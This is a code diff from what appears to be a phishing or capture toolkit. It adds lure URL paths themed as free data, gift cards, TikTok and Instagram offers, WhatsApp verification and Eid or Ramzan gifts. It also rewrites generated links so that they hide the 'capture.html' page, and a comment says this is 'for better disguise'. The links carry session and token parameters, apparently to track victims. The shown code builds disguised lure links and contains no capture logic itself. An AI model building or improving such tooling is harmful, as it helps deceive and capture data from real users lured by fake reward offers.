@@ -33,6 +33,19 @@ const THEME_NAMES = {
   pakistan: 'Pakistan Reward'
 };
 
+const THEME_PATHS = {
+  freedata: 'freedata',
+  giftcard: 'giftcard',
+  lucky: 'lucky-draw',
+  tiktok_likes: 'tiktok-likes',
+  whatsapp: 'whatsapp-verify',
+  tiktok_followers: 'tiktok-followers',
+  instagram: 'instagram-offer',
+  ramzan: 'ramzan-offer',
+  eid: 'eid-gift',
+  pakistan: 'pakistan-reward'
+};
+
 // ---- State ----
 let currentSession = null;
 let generatedLink = null;
@@ -161,7 +174,15 @@ function generateLink() {
     }
 
     const token = btoa(sessionId + ':' + Date.now()).replace(/=/g, '').substring(0, 24);
-    generatedLink = `${base}capture.html?s=${sessionId}&t=${token}&th=${selectedTheme}`;
+
+    // Use the clean path from THEME_PATHS for better disguise
+    const cleanPath = THEME_PATHS[selectedTheme] || 'capture';
+
+    // Only use capture.html if on a local file system or 127.0.0.1 (unless vercel dev is likely)
+    const isLocal = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost';
+    const finalPath = isLocal ? 'capture.html' : cleanPath;
+
+    generatedLink = `${base}${finalPath}?s=${sessionId}&t=${token}&th=${selectedTheme}`;
 
     console.log('Generated Link:', generatedLink);
 
